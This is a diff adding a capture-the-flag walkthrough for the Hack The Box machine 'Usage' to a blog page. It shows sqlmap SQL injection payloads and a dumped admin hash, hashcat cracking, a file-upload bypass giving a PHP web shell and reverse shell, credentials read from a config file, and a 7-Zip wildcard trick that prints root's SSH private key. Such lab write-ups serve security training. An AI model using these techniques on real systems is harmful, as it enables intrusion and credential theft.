@@ -49,6 +49,7 @@
         <section id="enumeration" class="section">
     <h2>Enumeration:</h2>
     <h3>Nmap:</h3>
+    <br><br>
     <!-- Terminal Window: Rustscan Output -->
     <div class="terminal-window">
         <div class="window-header">
@@ -76,6 +77,454 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
         </div>
     </div>
     <p>During the initial Nmap scan of the target machine <code>10.10.11.18</code>, two open ports were identified. Port 22 is running OpenSSH 8.9p1 on Ubuntu Linux, indicating that an SSH service is accessible. This suggests potential areas to explore, such as checking for default or weak credentials, investigating any known vulnerabilities in OpenSSH 8.9p1, and reviewing the service configuration for possible misconfigurations. Additionally, port 80 is open and running nginx 1.18.0 on Ubuntu. The HTTP service responds with a redirect to <code>http://usage.htb/</code>, indicating a virtual host setup. To interact with this web application correctly, it is essential to add an entry for <code>usage.htb</code> in the <code>/etc/hosts</code> file, mapping it to the target’s IP address (<code>10.10.11.18</code>).</p>
+    <br><br>
+    <img src="./image.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p>
+</p><br><br><p>To identify the server&#x27;s framework, we accessed a non-existent page to trigger a 404 error. Using the <a href="https://0xdf.gitlab.io/cheatsheets/404#laravel">404 cheatsheet</a>, we determined that the server is running the PHP Laravel web framework.</p><br><br><p>
+</p><img src="./image 1.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><br><br><p><p>
+</p><p>Clicking the &quot;Admin&quot; option in the navigation bar redirects us to <strong>admin.usage.htb</strong>.</p><br><br><img src="./image 2.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>After adding <strong>admin.usage.htb</strong> to the <strong>/etc/hosts</strong> file, we accessed a web page that allows the admin to log in.</p><br><br><img src="./image 3.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><br><br><p>If we attempt to reset the password for a non-registered user, an error message is displayed stating that the email address does not match any records.</p><br><br><img src="./image 4.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><br><br><p>After registering a user on the <strong>register</strong> page, we attempted to reset the password and received a confirmation email.</p><br><br><img src="./image 5.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>After logging in, we are directed to a dashboard that displays several featured blogs.</p><br><br><img src="./image 6.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p>
+</p></p></p></p></p></p></section>
+
+<section  id="Sql Injection" class="section">
+<h2>Sql Injection:</h2><p>In the password reset email, when we attempt to send a single quote (<code>&#x27;</code>), we receive a 500 server error. This is a strong indication of a potential SQL injection vulnerability.</p><br><br><img src="./image 7.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>We captured the password reset request and tested the email field for SQL injection vulnerabilities. The Burp Suite request was saved for further analysis.</p><br><br><img src="./image 8.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>Using <strong>sqlmap</strong> with <code>--level 5 --risk 3</code>, we confirmed that the email parameter is vulnerable to SQL injection. Upon dumping the database, we discovered a database named <strong>usage_blogs</strong> containing 15 tables. One of these tables, <strong>admin_user</strong>, contained the hashed password for the administrator user.</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>sqlmap -r Password-reset.req --batch --risk 3 --level 5 --dump --threads 10 -D usage_blog -T admin_users 
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9#stable}
+|_ -| . [.]     | .&#x27;| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:15:03 /2025-02-21/
+
+[11:15:03] [INFO] parsing HTTP request from &#x27;Password-reset.req&#x27;
+custom injection marker (&#x27;*&#x27;) found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter &#x27;XSRF-TOKEN&#x27; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[11:15:04] [INFO] resuming back-end DBMS &#x27;mysql&#x27; 
+[11:15:04] [INFO] testing connection to the target URL
+got a 302 redirect to &#x27;http://usage.htb/forget-password&#x27;. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=1RUNHlpHVhgMJStomgI4c89F4FOlOQJE2J9keHRl&amp;email=&#x27; AND 2377=(SELECT (CASE WHEN (2377=2377) THEN 2377 ELSE (SELECT 1163 UNION SELECT 3153) END))-- jzRH
+
+    Type: time-based blind
+    Title: MySQL &gt; 5.0.12 AND time-based blind (heavy query)
+    Payload: _token=1RUNHlpHVhgMJStomgI4c89F4FOlOQJE2J9keHRl&amp;email=&#x27; AND 1106=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- jmNy
+---
+[11:15:06] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL &gt; 5.0.12
+[11:15:06] [INFO] fetching columns for table &#x27;admin_users&#x27; in database &#x27;usage_blog&#x27;
+[11:15:06] [INFO] retrieved: 
+&lt;SNIP&gt;
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | &lt;blank&gt; | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+
+[11:28:37] [INFO] table &#x27;usage_blog.admin_users&#x27; dumped to CSV file &#x27;/home/deepak/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv&#x27;
+[11:28:37] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 892 times
+[11:28:37] [INFO] fetched data logged to text files under &#x27;/home/deepak/.local/share/sqlmap/output/usage.htb&#x27;
+
+[*] ending @ 11:28:37 /2025-02-21/
+
+</code></pre></div></div><p>
+</p><br><br><p>We used <strong>Hashcat</strong> to attempt cracking the hash obtained from the <strong>admin_user</strong> table.</p><br><br><p>
+</p><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>hashcat -m 3200 -a 0 admin.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz, 2845/5755 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH...fUPrL2
+Time.Started.....: Fri Feb 21 11:33:33 2025 (44 secs)
+Time.Estimated...: Fri Feb 21 11:34:17 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       37 H/s (15.95ms) @ Accel:4 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1600/14344385 (0.01%)
+Rejected.........: 0/1600 (0.00%)
+Restore.Point....: 1584/14344385 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: alexis1 -&gt; dragon1
+Hardware.Mon.#1..: Temp: 74c Util: 93%
+
+Started: Fri Feb 21 11:33:26 2025
+Stopped: Fri Feb 21 11:34:18 2025
+</code></pre></div></div><br><br><p>We successfully cracked the admin hash using <strong>Hashcat</strong> with the <strong>rockyou.txt</strong> wordlist, and the password was <strong>whatever1</strong>.</p><p>
+</p></p></p></section>
+<section id="Admin Login" class="section">
+<h2>Admin Login:</h2><p>Using the cracked credentials, we first tried logging into the admin panel with the username from the <strong>admin_user</strong> table in the <strong>usage_blogs</strong> database, but it was invalid. We then tried the username <strong>admin</strong> with the same password, and successfully logged into the admin panel.</p><br><br><img src="./image 9.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>After logging into the admin panel, we identified that the Laravel-Admin version is <strong>1.8.18</strong>.</p><br><br><img src="./image 10.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>Upon searching for known vulnerabilities, we found that <strong>Laravel Admin 1.8.18</strong> is vulnerable to:</p><ul><li><strong>Arbitrary File Upload Vulnerability (CVE-2023-24249)</strong></li></ul><ul><li><strong>Arbitrary Code Execution</strong> as detailed in <a href="https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096">this Snyk report</a>.</li></ul><p>
+</p><br><br><img src="./image 11.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p>
+</p></p></p></section>
+
+<section id="CVE-2023-24249" class="section">
+<h2><strong>CVE-2023-24249:</strong></h2><p>In the admin panel, there is a <strong>User Settings</strong> section that allows uploading an avatar for the administrator. This could be a potential entry point for uploading a malicious file to exploit the arbitrary file upload vulnerability.</p><br><br><img src="./image 12.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>When we attempted to upload a basic PHP shell payload as the avatar in the admin panel, we received an error message stating that only image files are allowed.</p><br><br><img src="./image 13.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>By simply renaming the <strong>shell.php</strong> file to <strong>shell.php.jpg</strong>, we were able to successfully upload the file as an avatar, bypassing the file type restriction.</p><br><br><img src="./image 14.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><br><br><p>After submitting the <strong>User Settings</strong> form in the admin panel, we captured the request in <strong>Burp Suite</strong>, modified the filename from <strong>shell.php.jpg</strong> to <strong>shell.php</strong>, and forwarded all requests. This allowed us to upload the PHP shell without the <code>.jpg</code> extension.</p><br><br><img src="./image 15.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>By intercepting the upload request, we discovered that the uploaded images are stored in the <strong>/uploads/images</strong> directory.</p><br><br><img src="./image 16.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>After modifying the request and uploading the <strong>shell.php</strong> file, we noticed that the uploaded file was reflected as the admin&#x27;s avatar, confirming that the file was successfully stored on the server.</p><br><br><img src="./image 17.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p><br><br><p>By visiting <strong>admin.usage.htb/uploads/images/shell.php?cmd=id</strong>, we successfully executed a command and confirmed that the server responded with the user ID, indicating that our shell is working and we have command execution access.</p><br><br><p>
+</p><img src="./image 18.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><p><p>
+</p></p></p></p></p></p></p></p></section>
+
+<section id="Shell as Dash" class="section">
+</p><h2>Shell as Dash:</h2><p>By repeating the method and modifying the payload, we successfully obtained a <strong>reverse shell</strong>, gaining interactive access to the target server.</p><p>
+</p><br><br><img src="./image 19.png" alt="Blog Directory Screenshot" style="max-width: 100%; height: auto;"><br><br><p><p>
+</p><p>After setting up a <strong>Netcat listener</strong>, we received a shell with the <strong>dash (</strong><code><strong>/bin/dash</strong></code><strong>)</strong> shell environment.</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>nc -lvnp 7777
+listening on [any] 7777 ...
+
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.18] 48854
+bash: cannot set terminal process group (1223): Inappropriate ioctl for device
+bash: no job control in this shell
+dash@usage:/var/www/html/project_admin/public/uploads/images$ </code></pre></div></div><p>
+</p><br><br><p>looking through the dash home directory we get a file .monitrc which contained password </p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>dash@usage:~$ ls -la
+total 52
+drwxr-x--- 6 dash dash 4096 Feb 21 12:20 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    5 Feb 21 12:20 .monit.pid
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw------- 1 dash dash 1192 Feb 21 12:20 .monit.state
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 Feb 21 11:07 user.txt
+dash@usage:~$ cat .monitrc 
+cat .monitrc
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile &quot;/var/run/apache2/apache2.pid&quot;
+    if cpu &gt; 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage &gt; 80% for 2 cycles then alert
+    if cpu usage (user) &gt; 70% for 2 cycles then alert
+        if cpu usage (system) &gt; 30% then alert
+    if cpu usage (wait) &gt; 20% then alert
+    if loadavg (1min) &gt; 6 for 2 cycles then alert 
+    if loadavg (5min) &gt; 4 for 2 cycles then alert
+    if swap usage &gt; 5% then alert
+
+check filesystem rootfs with path /
+       if space usage &gt; 80% then alert
+</code></pre></div></div><br><br><p>
+</p><p>By reading the <strong>/etc/passwd</strong> file, we discovered another user on the system named <strong>xander</strong>.</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>dash@usage:~$ cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+dash:x:1000:1000:dash:/home/dash:/bin/bash
+xander:x:1001:1001::/home/xander:/bin/bash</code></pre></div></div><p>
+</p><br><br><p>Using the password <code><strong>3nc0d3d_pa$$w0rd</strong></code> found in the <strong>.monitrc</strong> file, we successfully <strong>SSH&#x27;d into the user Xander&#x27;s account</strong>.</p><br><br><p>
+</p><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>ssh xander@usage.htb
+xander@usage.htb&#x27;s password: 
+xander@usage:/var/backups$</code></pre></div></div><p>
+</p>
+</p></section>
+
+<section id="Privilege escalation" class="section">
+<h2><strong>Privilege escalation:</strong>
+</h2><p>Running <code>sudo -l</code> revealed that we can execute <strong>/usr/bin/usage_management</strong> as <strong>root</strong> without a password.</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>xander@usage:/var/backups$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+</code></pre></div></div><br><br><p>
+</p><p>Executing <strong>/usr/bin/usage_management</strong> presented three options:</p><ol type="1" start="1"><li><strong>Project Backup</strong></li></ol><ol type="1" start="2"><li><strong>Backup MySQL Data</strong></li></ol><ol type="1" start="3"><li><strong>Reset Admin Password</strong></li></ol><p>During our analysis, we also discovered that <strong>7-Zip version 16.02</strong> is installed on the system.</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>xander@usage:~$ /usr/bin/usage_management 
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 54871534
+
+Scanning the drive:
+          
+
+ERROR:
+stat error for ./rootkey (Permission denied)
+</code></pre></div></div><p>
+</p><br><br><p>By running the <strong>strings</strong> command on <strong>/usr/bin/usage_management</strong>, we discovered that the <strong>/var/www/html</strong> directory is being archived using <strong>7-Zip (7za)</strong> with the following command:</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+</code></pre></div></div><br><br><p>The backup is saved as <strong>project.zip</strong> in the <strong>/var/backups/</strong> directory.</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>xander@usage:~$ strings /usr/bin/usage_management 
+/lib64/ld-linux-x86-64.so.2
+chdir
+__cxa_finalize
+__libc_start_main
+puts
+system
+__isoc99_scanf
+perror
+printf
+libc.so.6
+GLIBC_2.7
+GLIBC_2.2.5
+GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+PTE1
+u+UH
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A &gt; /var/backups/mysql_backup.sql
+Password has been reset.
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 
+Invalid choice.
+:*3$&quot;
+GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
+Scrt1.o
+__abi_tag
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+usage_management.c
+__FRAME_END__
+_DYNAMIC
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+backupMysqlData
+__libc_start_main@GLIBC_2.34
+_ITM_deregisterTMCloneTable
+puts@GLIBC_2.2.5
+_edata
+_fini
+chdir@GLIBC_2.2.5
+backupWebContent
+system@GLIBC_2.2.5
+printf@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+_end
+__bss_start
+main
+resetAdminPassword
+perror@GLIBC_2.2.5
+__isoc99_scanf@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@GLIBC_2.2.5
+_init
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+</code></pre></div></div><br><br><p>Referring to the <strong>HackTricks</strong> guide on wildcard exploitation with <strong>7-Zip</strong>, we leveraged this technique to read root-owned files by abusing the way <strong>7za</strong> processes wildcards (<code>*</code>). This allowed us to access sensitive files with root permissions.</p><p>And you can create files in the folder were this is being executed, you could create the file <code>@rootkey</code> and the file <code>rootkey</code> being a <strong>symlink</strong> to the file you want to read:</p><p>bash</p><p>Then, when <strong>7z</strong> is execute, it will treat <code>rootkey</code> as a file containing the list of files it should compress (thats what the existence of <code>@rootkey</code> indicates) and when it 7z read <code>rootkey</code> it will read <code>/root/.ssh/id_rsa</code> and <strong>as the content of this file isn&#x27;t a list of files, it will throw and error</strong> showing the content.</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code>xander@usage:~$ cd /var/www/html
+xander@usage:/var/www/html$ touch @rootkey
+xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa rootkey
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+          
+WARNING: No more files
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+
+WARNING: No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+
+
+WARNING: No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+
+
+WARNING: No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+
+
+WARNING: No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+
+
+WARNING: No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+
+
+WARNING: No more files
+-----END OPENSSH PRIVATE KEY-----
+
+2984 folders, 17973 files, 114779094 bytes (110 MiB)
+
+Creating archive: /var/backups/project.zip
+
+Items to compress: 20957
+
+                                                                               
+Files read from disk: 17973
+Archive size: 54871534 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+----------------
+Scan WARNINGS: 7
+</code></pre></div></div><br><br><p>Using the <strong>root&#x27;s id_rsa</strong> private key, we successfully <strong>SSH&#x27;d into the system as root</strong>, gaining full control over the machine. 🎉</p><br><br><div class="terminal-window">    <div class="window-header">        <span class="button close"></span>        <span class="button minimize"></span>        <span class="button maximize"></span>    </div>    <div class="terminal">        <pre><code> ssh -i root_idrsa root@usage.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Fri Feb 21 11:48:56 AM UTC 2025
+
+  System load:           0.1279296875
+  Usage of /:            65.7% of 6.53GB
+  Memory usage:          19%
+  Swap usage:            0%
+  Processes:             226
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.18
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:f0ea
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
+root@usage:~# ls
+cleanup.sh  root.txt  snap  usage_management.c</code></pre></div></div>
 </section>
 <hr>
 <section id="Thanks" class="section">
